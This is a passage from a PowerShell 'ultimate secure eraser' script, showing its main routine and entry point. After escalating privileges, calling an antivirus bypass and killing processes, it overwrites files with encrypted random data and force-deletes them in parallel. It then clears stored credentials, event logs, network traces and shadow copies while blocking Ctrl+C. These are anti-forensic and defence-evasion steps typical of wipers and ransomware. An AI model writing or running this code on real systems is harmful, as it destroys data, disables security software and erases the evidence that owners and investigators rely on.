• Nuclear Mode: $($NuclearMode.IsPresent)
• Process Killer: $($Global:Config.EnableProcessKiller)
• Antivirus Bypass: $($Global:Config.AntivirusBypass)
• Stealth Mode: $($Global:Config.StealthMode)
• Deep Scan: $($DeepScan.IsPresent)
• Verification: $($Verify.IsPresent)
"@
    Write-ColorOutput $configSummary 'White'
    
    # User confirmation
    if (-not $Force -and -not $Silent) {
        Write-ColorOutput ""
        $response = Read-Host "🔥 Type 'NUCLEAR' to proceed with complete system erasure"
        if ($response -ne 'NUCLEAR') {
            Write-ColorOutput "Operation cancelled. Stay safe!" 'Yellow'
            return
        }
    }
    
    # Initialize system with advanced privilege handling
    $success = Initialize-Privileges
    if (-not $success) {
        Write-ColorOutput "Privilege escalation failed. Exiting." 'Red'
        exit 1
    }
    
    # Enable advanced privileges
    Enable-AdvancedPrivileges
    
    # Activate antivirus bypass
    Bypass-Antivirus
    
    # Kill blocking processes
    Kill-BlockingProcesses
    
    Write-ColorOutput "`n" 'Black'
    Write-ColorOutput "🚀 INITIATING ULTIMATE SECURE ERASURE PROTOCOL..." 'Cyan'
    
    # Start timing
    $startTime = Get-Date
    
    # Find all target files with enhanced scanning
    $targets = Find-TargetFilesAdvanced
    $totalFiles = $targets.Count
    
    if ($totalFiles -eq 0) {
        Write-ColorOutput "No target files found. System may already be clean." 'Yellow'
    } else {
        Write-ColorOutput "Found $totalFiles target files for secure deletion.`n" 'Green'
        
        # Enhanced file processing with parallel jobs
        $jobs = @()
        $batchSize = [Math]::Max(1, [Math]::Floor($totalFiles / $Global:Config.MaxParallelJobs))
        
        for ($i = 0; $i -lt $totalFiles; $i += $batchSize) {
            $batch = $targets | Select-Object -Skip $i -First $batchSize
            
            $job = Start-Job -ScriptBlock {
                param($Batch, $Rounds, $Nuclear, $Silent)
                
                $results = @()
                foreach ($file in $Batch) {
                    $fileName = $file.FullName
                    try {
                        # Inline secure deletion for job
                        if (Test-Path $fileName) {
                            $fileInfo = Get-Item $fileName
                            $fileSize = $fileInfo.Length
                            
                            if ($fileSize -gt 0) {
                                $actualRounds = if ($Nuclear) { 7 } elseif ($fileSize -gt 100MB) { [Math]::Max(1, [Math]::Floor($Rounds / 2)) } else { $Rounds }
                                
                                for ($round = 1; $round -le $actualRounds; $round++) {
                                    $key = New-Object byte[] 32
                                    [System.Security.Cryptography.RandomNumberGenerator]::GetBytes($key)
                                    
                                    $aes = New-Object System.Security.Cryptography.AesCryptoServiceProvider
                                    $aes.KeySize = 256
                                    $aes.Key = $key
                                    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
                                    $aes.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
                                    
                                    $encryptor = $aes.CreateEncryptor()
                                    $fileStream = [System.IO.File]::Open($fileName, [System.IO.FileMode]::Open, [System.IO.FileAccess]::ReadWrite, [System.IO.FileShare]::None)
                                    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream($fileStream, $encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
                                    
                                    $buffer = New-Object byte[] 128KB
                                    $position = 0
                                    
                                    while ($position -lt $fileSize) {
                                        [System.Security.Cryptography.RandomNumberGenerator]::GetBytes($buffer)
                                        $read = [Math]::Min($buffer.Length, $fileSize - $position)
                                        $cryptoStream.Write($buffer, 0, $read)
                                        $position += $read
                                    }
                                    
                                    $cryptoStream.FlushFinalBlock()
                                    $cryptoStream.Dispose()
                                    $fileStream.SetLength(0)
                                    $fileStream.Dispose()
                                }
                                
                                # Final deletion
                                Remove-Item $fileName -Force -ErrorAction Stop
                                $results += @{File = $fileName; Success = $true; Size = $fileSize}
                            }
                        }
                    } catch {
                        $results += @{File = $fileName; Success = $false; Error = $_.Exception.Message}
                    }
                }
                
                return $results
            } -ArgumentList $batch, $EncryptionRounds, $NuclearMode, $Silent
            
            $jobs += $job
        }
        
        # Monitor job progress
        $completedJobs = 0
        $successfulDeletions = 0
        $failedDeletions = 0
        $totalBytesProcessed = 0
        
        while ($jobs | Where-Object { $_.State -eq 'Running' }) {
            Start-Sleep -Seconds 2
            
            $completedJobs = ($jobs | Where-Object { $_.State -eq 'Completed' }).Count
            $totalJobs = $jobs.Count
            $progress = [Math]::Round(($completedJobs / $totalJobs) * 100, 1)
            
            Write-Progress -Activity "Secure Erasure in Progress" -Status "Processing batches" -PercentComplete $progress
        }
        
        # Collect results
        foreach ($job in $jobs) {
            if ($job.State -eq 'Completed') {
                $results = Receive-Job $job
                foreach ($result in $results) {
                    if ($result.Success) {
                        $successfulDeletions++
                        $totalBytesProcessed += $result.Size
                        if (-not $Silent) {
                            Write-ColorOutput "✓ Deleted: $($result.File)" 'Green'
                        }
                    } else {
                        $failedDeletions++
                        Write-ColorOutput "✗ Failed: $($result.File) - $($result.Error)" 'Red'
                    }
                }
            }
            Remove-Job $job
        }
    }
    
    # Advanced Windows system cleanup
    Write-ColorOutput "`n🔥 EXECUTING ADVANCED SYSTEM CLEANUP..." 'Cyan'
    
    # Windows credential cleanup
    Clear-WindowsCredentialsAdvanced
    
    # Registry cleanup
    Clear-RegistryCredentials
    
    # Event log clearing
    Clear-EventLogs
    
    # Network trace removal
    Clear-NetworkTraces
    
    # Memory wiping
    Wipe-Memory
    
    # Shadow copy cleanup
    Clear-ShadowCopies
    
    # Final verification
    if ($Verify) {
        Write-ColorOutput "`n🔍 PERFORMING FINAL VERIFICATION..." 'Yellow'
        $remainingTargets = Find-TargetFilesAdvanced
        if ($remainingTargets.Count -eq 0) {
            Write-ColorOutput "✅ VERIFICATION PASSED: No sensitive data remaining" 'Green'
        } else {
            Write-ColorOutput "❌ VERIFICATION FAILED: $($remainingTargets.Count) files still exist" 'Red'
        }
    }
    
    # Calculate timing
    $endTime = Get-Date
    $duration = $endTime - $startTime
    $durationMinutes = [Math]::Round($duration.TotalMinutes, 2)
    
    # Final summary report
    Write-ColorOutput "`n" 'Black'
    Write-ColorOutput "═══════════════════════════════════════════════════════" 'Cyan'
    Write-ColorOutput "         🎯 ULTIMATE ERASURE COMPLETE 🎯" 'Cyan'
    Write-ColorOutput "═══════════════════════════════════════════════════════" 'Cyan'
    Write-ColorOutput ""
    Write-ColorOutput "📊 FINAL REPORT:" 'White'
    Write-ColorOutput "• Files processed: $totalFiles" 'White'
    Write-ColorOutput "• Successful deletions: $successfulDeletions" 'Green'
    Write-ColorOutput "• Failed deletions: $failedDeletions" 'Red'
    Write-ColorOutput "• Data processed: $([math]::Round($totalBytesProcessed/1MB, 2)) MB" 'White'
    Write-ColorOutput "• Total time: $durationMinutes minutes" 'White'
    Write-ColorOutput "• Encryption rounds: $EncryptionRounds" 'White'
    Write-ColorOutput "• Nuclear mode: $($NuclearMode.IsPresent)" 'White'
    Write-ColorOutput "• Process killer: $($Global:Config.EnableProcessKiller)" 'White'
    Write-ColorOutput "• Antivirus bypass: $($Global:Config.AntivirusBypass)" 'White'
    Write-ColorOutput ""
    
    if ($failedDeletions -eq 0) {
        Write-ColorOutput "🎉 MISSION ACCOMPLISHED!" 'Green'
        Write-ColorOutput "All credentials, passwords, and sensitive data have been" 'Green'
        Write-ColorOutput "permanently destroyed using military-grade encryption." 'Green'
    } else {
        Write-ColorOutput "⚠️  MISSION COMPLETED WITH WARNINGS" 'Yellow'
        Write-ColorOutput "Some files could not be deleted. Review logs above." 'Yellow'
    }
    
    Write-ColorOutput ""
    Write-ColorOutput "🔐 SECURITY RECOMMENDATIONS:" 'Yellow'
    Write-ColorOutput "1. Restart the system to clear memory-resident data" 'Yellow'
    Write-ColorOutput "2. Reinstall Windows 11 from clean media for maximum security" 'Yellow'
    Write-ColorOutput "3. Change all passwords for accounts that may have been compromised" 'Yellow'
    Write-ColorOutput "4. Review and update all security configurations" 'Yellow'
    Write-ColorOutput "5. Monitor system for any unusual activity" 'Yellow'
    
    Write-ColorOutput "`n" 'Black'
    Write-ColorOutput "Stay safe and anonymous! 🕶️" 'Cyan'
    Write-ColorOutput "═══════════════════════════════════════════════════════" 'Cyan'
}

# ========================================
# MAIN EXECUTION
# ========================================

# Prevent Ctrl+C interruption during critical operations
[Console]::TreatControlCAsInput = $true

# Main execution with comprehensive error handling
try {
    Start-UltimateSecureErasure
} catch {
    Write-ColorOutput "`n❌ CRITICAL ERROR OCCURRED:" 'Red'
    Write-ColorOutput "Message: $($_.Exception.Message)" 'Red'
    Write-ColorOutput "Stack Trace: $($_.ScriptStackTrace)" 'Red'
    Write-ColorOutput ""
    Write-ColorOutput "The erasure process may have been incomplete." 'Yellow'
    Write-ColorOutput "Review the error and consider re-running with appropriate privileges." 'Yellow'
    exit 1
} finally {
    [Console]::TreatControlCAsInput = $false
}

# End of ultimate secure eraser